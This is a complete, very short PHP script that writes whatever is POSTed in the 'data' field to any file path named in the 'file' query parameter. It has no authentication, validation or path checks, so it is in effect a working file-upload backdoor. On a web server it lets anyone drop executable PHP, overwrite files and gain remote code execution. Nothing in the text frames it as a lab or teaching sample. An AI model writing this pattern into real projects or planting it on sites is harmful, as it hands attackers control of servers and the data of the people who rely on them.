<?php

$file = $_GET['file'];

$data = $_POST['data'];

file_put_contents($file, $data);


?>